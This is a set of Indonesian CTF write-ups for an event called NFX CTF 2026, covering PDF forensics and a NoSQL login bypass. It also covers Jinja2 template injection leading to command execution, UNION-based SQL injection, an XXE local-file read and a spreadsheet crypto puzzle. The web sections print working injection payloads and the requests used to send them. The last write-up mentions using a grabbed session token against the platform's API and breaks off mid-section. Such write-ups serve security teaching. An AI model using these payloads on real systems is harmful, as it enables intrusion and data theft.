1. `file`/`pdfinfo` → PDF 1.7, 1 halaman, **2357 B**, unencrypted, tanpa JS.
   `pdftotext -layout` → laporan Desember biasa (sama seperti soal Notulen),
   **tanpa** teks flag tersembunyi di halaman (beda teknik dari Notulen).
2. "Barang ikut terkirim tanpa tercatat di daftar isi" → cek lampiran PDF:
   ```
   pdfdetach -list laporan_kegiatan_bulan_desember.pdf
   → 1 embedded files
     1: doksli.txt
   ```
   **Embedded file yang tidak disebut di TOC** = barang tersembunyi itu.
3. `pdfdetach -saveall` → `doksli.txt` (36 B, ASCII, tanpa newline):
   ```
   TkZYe0QzQzBEM19ENE5EM0MwRDNfTDRHMX0=
   ```
   "belum dibuka dari bungkusnya" → bungkus = **base64**. Decode:
   ```python
   base64.b64decode("TkZYe0QzQzBEM19ENE5EM0MwRDNfTDRHMX0=")
   → b'NFX{D3C0D3_D4ND3C0D3_L4G1}'
   ```
4. Sanity: isi ter-decode membaca "DECODE DAN DECODE LAGI" (leetspeak:
   3=E, 0=O, 4=A, 1=I) → meta-hint bahwa bungkusnya memang base64, konsisten.
   Tidak ada lapis kedua (`NFX{...}` sudah format final, bukan base64 valid).

#### Kandidat flag

`NFX{D3C0D3_D4ND3C0D3_L4G1}` - prefix `NFX{}`

> Reproduksi: `pdfdetach -saveall -o out/ laporan_kegiatan_bulan_desember.pdf; base64 -d out/doksli.txt`

---

### 5. Flag & Verifikasi

**Flag:** `NFX{D3C0D3_D4ND3C0D3_L4G1}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-notulen-senin-pagi"></a>
# NFX CTF 2026 - Notulen Senin Pagi

* **Kategori:** Misc
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi web)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{M4kHLuK_T4k_K4s4T_M4T4}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Syahril

Sekretaris bilang udah nulis semuanya. Tapi, si Bos bilang gak liat apa-apa.

**Lampiran:**

- [laporan_kegiatan_bulan_november.pdf](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/osint/laporan_kegiatan_bulan_november.pdf) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `laporan_kegiatan_bulan_november.pdf`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran PDF satu halaman A4, tidak terenkripsi, dibuat dengan Word 2021, tanpa JavaScript atau acroform. Karena tidak ada lapisan kriptografi, pemeriksaan diarahkan ke cara teks bisa disembunyikan secara visual. Flag: `NFX{M4kHLuK_T4k_K4s4T_M4T4}`.

**Pemahaman inti:** Tidak ada enkripsi: flag ditulis dengan warna putih di bawah area laporan, jadi tak terlihat saat PDF dibuka tetapi tetap terbaca oleh ekstraktor teks.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran PDF satu halaman A4, tidak terenkripsi, dibuat dengan Word 2021, tanpa JavaScript atau acroform. Karena tidak ada lapisan kriptografi, pemeriksaan diarahkan ke cara teks bisa disembunyikan secara visual. `pdftotext -layout` mengeluarkan isi laporan biasa, dan di bagian paling akhir muncul string flag. Untuk membuktikan mekanismenya, `pdftohtml -xml -hidden` dipakai: hasilnya menunjukkan `color=#ffffff` untuk teks flag, serta posisi `top=908` sementara konten laporan berhenti di sekitar `top=596`. Artinya flag ditulis putih di atas kanvas putih dan diletakkan di luar area isi. Pengecekan seluruh dokumen memastikan hanya ada satu kandidat `NFX{...}`.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 08:46Z - SELESAI (flag ketemu)**

1. `pdfinfo` → 1 halaman A4, unencrypted, Creator Word 2021, Author
   `Syahril Rizky Fauzan`, tanpa JavaScript/acroform.
2. `pdftotext -layout` → isi laporan biasa (ringkasan kegiatan, rapat, kendala)
   … dan di bagian paling akhir muncul:
   ```
   NFX{M4kHLuK_T4k_K4s4T_M4T4}
   ```
   = teks yang **tidak terlihat saat PDF dibuka** (tesis "sekretaris nulis,
   bos gak lihat").
3. Bukti mekanisme penyembunyian - `pdftohtml -xml -hidden`:
   - `<fontspec id="6" … color="#ffffff"/>` dan `id="7" … color="#ffffff"`
     → **putih di atas kanvas putih** = invisible.
   - posisi teks flag `top="908"` sedangkan konten laporan berhenti di
     `top≈596` (halaman tinggi 1263 skala XML) → teks di bawah area isi.
4. Decoy check: hanya 1 kandidat `NFX{…}` di seluruh dokumen (satu-satunya baris
   non-putih-hitam yang memuat pola flag).

#### Kandidat flag

`NFX{M4kHLuK_T4k_K4s4T_M4T4}` - format `NFX{...}` sesuai spesifikasi event

> Artefak: `laporan_kegiatan_bulan_november.pdf` (tidak diubah), dump XML
> `pdftohtml -xml -hidden -stdout` (read-only).

---

### 5. Flag & Verifikasi

**Flag:** `NFX{M4kHLuK_T4k_K4s4T_M4T4}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-nexaidentity"></a>
# NFX CTF 2026 - NexaIdentity

* **Kategori:** Web
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi web)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{n0sql_0p3r4t0r_4uth_byp4ss}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

**NexaIdentity** adalah direktori karyawan internal dan portal identitas workspace untuk NexaCommerce. Karyawan dapat masuk, mencari kolega, membuka profil workspace, dan meninjau detail tim.

![img](https://c.tenor.com/Msq2DyQd-3sAAAAC/sailormoon-transformation.gif)

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/web/05_nexaidentity` (key: `NFXCTF-NFCC-NXCTF-2026`)
 **PORT BERUBAH tiap restart - cek terkini (jangan hardcode):**
```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=<nama>" -H "X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
# stopped -> action:up ; TTL <900dtk -> action:extend
```

---

### 2. TL;DR (Ringkasan Singkat)

Aplikasi Express dengan halaman login, dashboard, dan directory. Kredensial demo employee@nexaidentity.test / employee1234 memberi sesi connect.sid, dan enum route menemukan /directory/<id> untuk id 1 sampai 12, sementara /admin mengembalikan 403 dengan pesan khusus administrator People Operations. Flag: `NFX{n0sql_0p3r4t0r_4uth_byp4ss}`.

**Pemahaman inti:** Semua bypass konvensional gagal karena validasi login memakai query Mongo yang menerima objek. Payload `email[$ne]=x&password[$ne]=x` melewati autentikasi dan memberi sesi admin.

---

### 3. Analisis Awal (Recon / Discovery)

Aplikasi Express dengan halaman login, dashboard, dan directory. Kredensial demo `employee@nexaidentity.test / employee1234` memberi sesi `connect.sid`, dan enum route menemukan `/directory/<id>` untuk id 1 sampai 12, sementara `/admin` mengembalikan 403 dengan pesan khusus administrator People Operations. Sebelum menyerang, beberapa jalur umum diuji dan dicatat sebagai jalan buntu: SQLi login (`admin'--`, `' OR '1'='1`) menghasilkan 401, SSTI di parameter `q` direfleksikan literal, dan bypass `/admin` lewat path encoding, method override, header peran, referer, proto pollution, serta type juggling semuanya gagal. Pola kegagalan itu menunjukkan validasi bukan SQL, melainkan query objek. Karena server memakai parser `qs` tanpa sanitasi, field `email[$ne]` dan `password[$ne]` berubah menjadi operator Mongo `$ne`, dan pencocokan user pertama mengembalikan akun admin.

---

### 4. Eksploitasi / Penyelesaian

#### 7 Nov 2026 - ronde 3 (solver web)

Service: `NFX/web/05_nexaidentity` → `http://s1.nfx.my.id:45214` (dari `nxctl inspect`; port BERUBAH tiap restart - dulu 44164).
Artefak: `platform_tools/r3/nid-*.html`, `ns-admin.html`, `nexaidentity.jar`, `ns.jar`.

1. Login demo: `employee@nexaidentity.test / employee1234` → 302 `/dashboard`. Cookie `connect.sid` (express-session).
2. Enum: hanya `/`, `/login`, `/logout`, `/dashboard`, `/directory`, `/directory/<1..12>` (id 13+ = 404). `/admin` = **403** "restricted to People Operations administrators". Admin = Nadia Kusuma `admin@nexaidentity.test` (id 1).
3. Probe negatif (jangan diulang):
   - SQLi login (`admin'--`, `' OR '1'='1`) → 401 (parameterized / bukan SQL);
   - SSTI di `q` search (`{{7*7}}`, `<%=7*7%>`) → direfleksikan polos, tidak dievaluasi;
   - bypass `/admin`: path encoding, method override, header `X-Role/X-Admin/X-Forwarded-For`, referer, proto pollution (`__proto__[role]`), password array/type juggling → tetap 403/401;
   - brute password admin ~40 kandidat pola `<kata>1234` → semua 401.
4. **Exploit - NoSQL injection di login** (MongoDB + `qs` parser tanpa sanitasi):
   ```
   POST /login (Content-Type: application/x-www-form-urlencoded)
   email[$ne]=x&password[$ne]=x
   ```
   → 302 `/dashboard` (validasi lolos utk user pertama = Nadia Kusuma, admin).
5. `GET /admin` dgn cookie hasil login itu → **200**, flag di "Restricted recovery note":
   ```
   NFX{n0sql_0p3r4t0r_4uth_byp4ss}
   ```
   Bukti: `platform_tools/r3/ns-admin.html` (grep flag + teks admin console penuh).

**FLAG: `NFX{n0sql_0p3r4t0r_4uth_byp4ss}`** - sudah dilaporkan sebagai `FLAG_FOUND`.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{n0sql_0p3r4t0r_4uth_byp4ss}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-nexadocs"></a>
# NFX CTF 2026 - NexaDocs

* **Kategori:** Web
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{j1nja2_sstI_rce_v1a_gl0bals}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

![img](https://media.giphy.com/media/UPybwzQMTxt6YRkFEE/giphy.gif)

**NexaDocs Invoice Preview** adalah workspace invoice untuk studio kreatif kecil. Tim dapat mengelola klien, membuat dan memantau invoice, serta memakai Brand Studio untuk melihat preview header dan footer sebelum dikirim.

Brand Studio baru masuk tahap beta terbatas. Tim produk ingin melakukan review keamanan sebelum fitur ini dibuka untuk semua pelanggan.

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/web/02_nexadocs` (key: `NFXCTF-NFCC-NXCTF-2026`)
 **PORT BERUBAH tiap service restart - JANGAN hardcode. Cek port terkini:**
```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=<nama_service>" -H "X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
# bila status=stopped -> action:up dulu; TTL hampir habis -> action:extend
```

---

### 2. TL;DR (Ringkasan Singkat)

Aplikasi Flask dengan kredensial demo yang ditulis di halaman login: demo@nexadocs.test / demo1234. Setelah login, navigasi memperlihatkan /dashboard, /invoices, /clients, dan /studio (Brand Studio). Flag: `NFX{j1nja2_sstI_rce_v1a_gl0bals}`.

**Pemahaman inti:** Input Brand Studio masuk ke template Jinja2 tanpa sanitasi. Payload `cycler.__init__.__globals__.os.popen('cat /flag.txt')` memberi RCE, dan hasilnya harus di-unescape karena output di-HTML-escape.

---

### 3. Analisis Awal (Recon / Discovery)

Aplikasi Flask dengan kredensial demo yang ditulis di halaman login: `demo@nexadocs.test / demo1234`. Setelah login, navigasi memperlihatkan `/dashboard`, `/invoices`, `/clients`, dan `/studio` (Brand Studio). Enum endpoint umum seperti `api/*`, `invoices/<id>`, `flag`, `.git`, dan `console` semuanya 404, sehingga fokus berpindah ke fitur yang menerima input bebas, yaitu Brand Studio. Form `POST /studio` punya field `company_name` dan `footer_note` yang dirender ke preview invoice. Probe `{{7*7}}` menghasilkan `49`, yang mengonfirmasi template dievaluasi, dan `{{config}}` membocorkan `SECRET_KEY`. Karena output di-escape oleh HTML, pembacaan hasil harus di-unescape; payload `cycler.__init__.__globals__.os.popen('cat /flag.txt').read()` kemudian mengembalikan flag.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 09:30-09:47Z - SELESAI (SSTI Jinja2 → baca /flag.txt)**

#### Service

```bash
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"NFX/web/02_nexadocs"}'
# → running, port 43302, TTL 1799s (JANGAN hardcode port - bisa berubah tiap restart)
```
Artefak sesi: `platform_tools/r2/` (cookie jar `nxdoc.jar`, helper `ssti.py`).

#### Probe

1. GET `/` 200, Werkzeug/Flask. Halaman login menampilkan **kredensial demo**:
   `demo@nexadocs.test / demo1234`.
2. POST `/login` → **302 /dashboard**, session payload
   `{"full_name":"Rara Mahendra","user_id":1}`.
3. Setelah login nav: `/dashboard`, `/invoices`, `/clients`, `/studio` (Brand Studio).
   Endpoint enum (`api/*`, `invoices/<id>`, `flag`, `.git`, `console`) → 404.
4. **Brand Studio (`/studio`)** - form `POST` field `company_name` + `footer_note`
   → dirender ke `div.invoice-preview-brand` / `.invoice-preview-footer`.
   > Deskripsi resmi: "Brand Studio tahap beta, tim produk ingin review keamanan"
   > → titik serangnya fitur ini.

#### Probe-to-exploit (SSTI)

```
POST /studio company_name={{7*7}} → brand = "49" TEMPLATE DIRENDER
POST /studio company_name={{config}} → dump config Flask lengkap
                    SECRET_KEY = b'5\x06\x1c\x96SpNaw\xde\xb0U\xf07\xe6\x18'
POST /studio company_name=${7*7} → literal "${7*7}" (bukan Jinja-syntax lain)
POST /studio company_name={7*7} → literal
```
Output di-HTML-escape (`&lt;`, `&#39;`) → unescape dulu saat baca.
(XSS juga lolos: `<img src=x onerror=alert(1)>` dirender utuh - tapi bukan jalur flag.)

#### EXPLOIT - baca file lewat globals Jinja2

```bash
python3 platform_tools/r2/ssti.py "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}"
→ NFX{j1nja2_sstI_rce_v1a_gl0bals}
```
(`''.__class__.__mro__`/`subclasses` juga bisa; payload di atas langsung.)

#### Kandidat flag

`NFX{j1nja2_sstI_rce_v1a_gl0bals}` - prefix `NFX{}` , hasil `cat /flag.txt`
di container service (bukan tebakan). Hanya 1 kandidat di file.

> Catatan: laporan pertama sempat typo (`sstI_r1a`), sudah dikoreksi.
> Flag final = di atas.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{j1nja2_sstI_rce_v1a_gl0bals}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-nexacommerce"></a>
# NFX CTF 2026 - NexaCommerce

* **Kategori:** Web
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{sql1_un10n_bas3d_4uth_byp4ss}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

![img](https://media.giphy.com/media/NGN8hRTijoR3KEB4Hq/giphy.gif)

**NexaCommerce Order Lookup** adalah toko elektronik online tempat pelanggan dapat melihat katalog, mengelola akun, memantau riwayat pesanan, melacak kiriman, dan menghubungi dukungan. Data toko diisi dengan pelanggan, produk, dan pesanan yang lengkap.

Tim platform baru-baru ini melihat aktivitas tidak biasa di halaman akun dan pelacakan pesanan. Mereka meminta review independen sebelum rilis berikutnya.

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/web/01_nexacommerce` (key: `NFXCTF-NFCC-NXCTF-2026`)
 **PORT BERUBAH tiap service restart - JANGAN hardcode. Cek port terkini:**
```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=<nama_service>" -H "X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
# bila status=stopped -> action:up dulu; TTL hampir habis -> action:extend
```

---

### 2. TL;DR (Ringkasan Singkat)

Aplikasi Flask dengan halaman login, register, katalog produk, /track untuk melacak order, dan /support. Recon awal memetakan route dan menguji hipotesis umum satu per satu: register akun uji memberi session role:customer, mass assignment role=admin tidak berubah, login SQLi ' OR '1'='1 ditolak (parameterized), IDOR /account?user_id=1 mengembalikan konten yang sama, dan {{7*7}} direfleksikan literal (bukan SSTI). Flag: `NFX{sql1_un10n_bas3d_4uth_byp4ss}`.

**Pemahaman inti:** Login dan IDOR sudah aman, tetapi parameter `order_code` di `/track` masuk mentah ke query. SQLi UNION 3 kolom membuka tabel `messages`, dan pesan privat admin berisi flag.

---

### 3. Analisis Awal (Recon / Discovery)

Aplikasi Flask dengan halaman login, register, katalog produk, `/track` untuk melacak order, dan `/support`. Recon awal memetakan route dan menguji hipotesis umum satu per satu: register akun uji memberi session `role:customer`, mass assignment `role=admin` tidak berubah, login SQLi `' OR '1'='1` ditolak (parameterized), IDOR `/account?user_id=1` mengembalikan konten yang sama, dan `{{7*7}}` direfleksikan literal (bukan SSTI). Semua jalur itu dicatat sebagai buntu. Perhatian lalu beralih ke fitur yang memproses input terstruktur, yaitu `/track` dengan `order_code`. Baseline `NX-10001` memberi 1 hasil, sedangkan `' OR '1'='1` memberi 41 hasil, yang membuktikan injeksi. `' UNION SELECT 1,2,3--` menentukan jumlah kolom, `sqlite_master` mengungkap lima tabel, dan tabel `messages` menyimpan pesan privat `is_private=1` dari user admin yang berisi flag.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 09:30-09:52Z - SELESAI (SQLi UNION → pesan privat berisi flag)**

#### Service (PORT BERUBAH - selalu inspect)

```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=NFX%2Fweb%2F01_nexacommerce" -H "$K"
# → port 42728, running; extend 2× (493s → 1358s → 1432s) sebelum exploit
```
Artefak sesi: `platform_tools/r2/` (cookie jar `nc_session.jar`, helper `uni.py`).

#### Probe (urutan, kecil dulu)

1. GET `/` 200 (Werkzeug/Flask), link: `/login`, `/register`, `/products`,
   `/track`, `/support`. Halaman login **tanpa** kredensial demo.
2. Path enum (`admin|api|flag|flag.txt|.git|console|__debugger__|.env|robots.txt`) → **semua 404**;
   `/static/css/../..` jatuh ke homepage (tak ada traversal nyata).
3. Register akun uji `kojprobe@example.com` → **302 /account**, session payload
   `{"full_name":"KoJ Probe","role":"customer","user_id":33}`.
   - Mass-assignment probe (`role=admin|staff`, `is_admin=1`, `admin=1`,
     `user_type=admin`) → **semua tetap `role:customer`** bukan jalurnya.
4. Login SQLi (`' OR '1'='1`) → `Invalid email or password.` (parameterized).
5. IDOR `/account?user_id=1` → konten identik (3320 B) .
6. Refleksi/SSTI: `{{7*7}}` di `full_name` & `order_code` direfleksikan **literal**
   (`Welcome back, {{7*7}}`) → **bukan SSTI** .

#### EXPLOIT - SQLi di `/track` (order_code)

```
POST /track order_code=...
NX-10001 → 200 "1 match" (baseline )
NX-10001' → tak ada section "Results" (path error)
NX-100% , % → "0 matches" → bukan LIKE; query = order_code = '<input>'
' OR '1'='1 → "41 matches" ← injeksi jalan, dump semua order
' UNION SELECT 1,2,3-- → sel jadi 1 | 2 | 3 ← UNION 3 kolom
' UNION SELECT name,sql,3 FROM sqlite_master--
                    → 5 tabel: messages, orders, products, sqlite_sequence, users
' UNION SELECT 1,2,sqlite_version()-- → 3.46.1 (SQLite)
```
Helper: `python3 platform_tools/r2/uni.py "<payload>"`

#### Ekstraksi data

- `users` (40 baris): admin `id=1 admin@nexacommerce.test role=admin`
  (hash `e09209ba…561c`), sisanya customer dengan hash identik
  `61e2d7af…40110` (tak perlu di-crack - bukan jalur flag).
- **Cari flag di `messages`:**
```
' UNION SELECT id||' u'||user_id||' '||sender, subject||' / '||substr(body,1,200), is_private
  FROM messages WHERE body LIKE '%NFX%' OR subject LIKE '%NFX%' OR body LIKE '%flag%'--
→ 1 match:
  31 u1 system | Internal audit follow-up / Finance and platform team: rotate the
  production API keys before Friday. Temporary recovery flag for the audit console:
  NFX{sql1_un10n_bas3d_4uth_byp4ss} | is_private=1
```
→ pesan **privat** (is_private=1, sender `system`, user_id 1=admin) - persis
"aktivitas tidak biasa di halaman akun" dari deskripsi.

#### Kandidat flag

`NFX{sql1_un10n_bas3d_4uth_byp4ss}` - prefix `NFX{}` , diambil langsung dari
DB via UNION (bukan tebakan). Cek dekoi: LIKE `%NFX%` hanya 1 baris di seluruh tabel.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{sql1_un10n_bas3d_4uth_byp4ss}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-nexasupply"></a>
# NFX CTF 2026 - NexaSupply

* **Kategori:** Web
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi web)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

**NexaSupply** adalah portal supplier untuk jaringan NexaCommerce. Supplier dapat masuk, meninjau katalog yang mereka publikasikan ke storefront, serta mengimpor pembaruan stok atau harga dari feed XML hasil ekspor ERP mereka.

![img](https://4kwallpapers.com/images/walls/thumbs_3t/9793.jpg)

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/web/04_nexasupply` (key: `NFXCTF-NFCC-NXCTF-2026`)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

---

### 2. TL;DR (Ringkasan Singkat)

Aplikasi Flask dengan kredensial demo supplier@nexasupply.test / supply1234 dan fitur import XML di /import. Halaman import memuat hint eksplisit: importer masih menerima feed berbasis DTD dari jembatan ERP lama. Flag: `NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}`.

**Pemahaman inti:** Importer menerima feed berbasis DTD, dan entity eksternal dievaluasi. XXE `file:///flag.txt` langsung muncul di preview, tanpa perlu menembus login.

---

### 3. Analisis Awal (Recon / Discovery)

Aplikasi Flask dengan kredensial demo `supplier@nexasupply.test / supply1234` dan fitur import XML di `/import`. Halaman import memuat hint eksplisit: importer masih menerima feed berbasis DTD dari jembatan ERP lama. Hint itu mengarahkan recon ke parser XML, bukan ke form login. Probe pertama memakai feed valid untuk baseline (`PROBE-OK-1` menghasilkan 1 baris), lalu DOCTYPE dengan entity `SYSTEM file:///etc/hostname` menghasilkan hostname container di field Name dan Description, yang membuktikan entity dievaluasi dan isi file keluar di preview. Percobaan `file:///proc/self/environ` gagal karena NUL byte, tetapi justru membuktikan file dibaca sampai byte tersebut. Loop path pendek kemudian menemukan `/flag.txt` dan flag muncul di preview.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 08:47-08:56Z - SELESAI (flag ketemu via XXE)**

#### Probe

- `curl .../inspect&name=NFX%2Fweb%2F04_nexasupply` → **port 46035** (bukan
  46947 seperti di brief awal; 46947 → 502). Running, sisa TTL ~1567 dtk.
- GET `/` → HTTP 200, `Server: Werkzeug/3.1.9 Python/3.11.18` (Flask),
  3670 B. Ada `/login`, `/sample.xml`.
- Path enum (GET): `catalog|import|dashboard|logout` → **302** (perlu sesi);
  `admin|api|register|debug|console|robots.txt` → 404.
- GET `/login` → ada **kredensial demo tertulis di halaman**:
  `supplier@nexasupply.test / supply1234` (ini bukan celah, memang disiapkan).
- POST `/login` (multipart form) → **302 Location: /dashboard** + `Set-Cookie: session=…` (Flask session).
- GET `/dashboard` → supplier `PT Sinar Nusantara Elektronik` (Rani Kusuma),
  4 SKU, nav: `/catalog`, `/import`, `/imports`.
- GET `/import` → form `POST /import` `enctype=multipart/form-data`,
  field `feed` (file .xml) + textarea paste. **Hint eksplisit di halaman:**
  > *"Legacy compatibility - The importer still accepts **DTD-based feeds**
  > from the old ERP bridge."*

#### Probe-to-exploit

1. **Baseline (feed valid):** `PROBE-OK-1` → 200, `Import preview - 1 product row parsed` parser jalan.
2. **XXE probe:** DOCTYPE `<!ENTITY xxe SYSTEM "file:///etc/hostname">` →
   preview menampilkan `42fd0dae6af7` (hostname container) di field Name
   **dan** Description → **entity dievaluasi, isi file keluar di preview**
3. `file:///proc/self/environ` → error:
   `XML feed could not be parsed: Char 0x0 out of allowed range` (NUL byte;
   justru membuktikan isi file dibaca sampai byte NUL).
4. **Eksploit (loop kandidat path, 1 request/path):**
   - `file:///flag` → kosong/tidak ada
   - **`file:///flag.txt` → `NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}`** STOP

#### Payload final (reproduksi)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE products [ <!ENTITY e SYSTEM "file:///flag.txt"> ]>
<products>
  <product><sku>X</sku><name>&e;</name><category>Accessories</category>
  <description>d</description><price>1.00</price><stock>1</stock></product>
</products>
```
`curl -b session -F 'feed=@f.xml;type=application/xml' http://s1.nfx.my.id:46035/import`

#### Kandidat flag

`NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}` - format `NFX{...}` , baca langsung dari
`/flag.txt` di container service (bukan tebakan).

> Catatan: beberapa request preview mengirim SKU `PROBE-OK-1`/`X` - hanya
> preview (katalog berubah hanya kalau ada langkah commit); kalau katalog
> ikut berubah, itu efek samping normal interaksi challenge.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-black-box-protocol-n4t0"></a>
# NFX CTF 2026 - Black Box Protocol N4T0

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi pwn)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Kada

Sebuah jet tempur Sukhoi Su-30 terjatuh menyimpan pesan yang masih terselamatkan, kejadian ini terjadi di perbatasan negara aliansi nato

![gambar](https://tse4.mm.bing.net/th/id/OIP.mNIINUuvuAT0kjxVuXIHfAHaE0?r=0&pid=Api&h=220&P=0)



> Format: NFX{World_World_World_.....}

**Lampiran:**

- [flight_recovery_manifest.xlsx](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/BlackBoxProtocolN4T0/flight_recovery_manifest.xlsx) (type: file)

**Service / Target:**

- tidak ada

**Berkas di workspace:** `flight_recovery_manifest.xlsx`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran berupa flight_recovery_manifest.xlsx dengan satu sheet Mail_Black_Box dan tanpa docProps. Pemeriksaan struktur internal tidak menemukan petunjuk di persons.xml atau drawing1.xml yang kosong; yang relevan justru isi sel dan formatnya. Flag: `NFX{N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng}`.

**Pemahaman inti:** Flag disusun dari tiga kolom manifest, bukan dari satu sel: kode hex 2 digit, label fonetik NATO, dan nilai ilmiah. Casing dan underscore mengikuti mask `Format: NFX{World_World_...}`.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran berupa `flight_recovery_manifest.xlsx` dengan satu sheet `Mail_Black_Box` dan tanpa `docProps`. Pemeriksaan struktur internal tidak menemukan petunjuk di `persons.xml` atau `drawing1.xml` yang kosong; yang relevan justru isi sel dan formatnya. Kolom B memuat pasangan angka yang sebagian berupa numerik (`62`, `62.0`) dan sebagian berupa string hex (`6d`, `4f`, `5f`), yang menunjukkan data hex 2 digit. Kolom lain memberi label fonetik NATO dan nilai ilmiah (`numFmtId=11`, `0.0E+00`). Pemahaman kuncinya adalah flag dirakit dari beberapa kolom secara berurutan, lalu casing dan pemisah kata disesuaikan dengan mask pada deskripsi. Kandidat yang hanya memakai satu kolom sudah ditolak server, dan kandidat final memuat urutan lengkap `N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng`.

---

### 4. Eksploitasi / Penyelesaian

#### 7 Nov 19:55 - Temuan kolom C + flag placeholder live

- **Kolom C BUKAN red herring.** Nilai C2..C4 adalah representasi desimal dari bit **float32 big-endian**:
  | sel | nilai xlsx | `struct.pack('>f', v)` | ASCII |
  |---|---|---|---|
  | C2 | `2.78842154354096E23` | `66 6c 30 41` | `fl0A` |
  | C3 | `7.07930905431442E31` | `74 5f 62 34` | `t_b4` |
  | C4 | `3.57380928075183E30` | `72 34 6e 67` | `r4ng` |
  → C = **`fl0At_b4r4ng`** (12 char). Decode diverifikasi ulang via Python, roundtrip cocok.
- Dengan A = `N4T0PH0N3T1C1N1`, B = `C0mbO_H3X_`, C = `fl0At_b4r4ng`.
- **Placeholder live** dari RPC `get_challenge_placeholder` (challenge `f72a1790…`, via
  `https://api.nxctf.my.id/rest/v1/rpc/` + anon key frontend + JWT KoJ yang baru di-grab):
  ```
  XXX{X0X0_Xx0x0x0x_0x0X0xxX_X0X_xx0Xx_x0x0xx}
  ```
  (fungsi mask platform: uppercase→`X`, lowercase→`x`, digit→`0`, `_`/`{}` tetap.)
- Mask 44 char itu **match PERSIS** dengan:
  ```
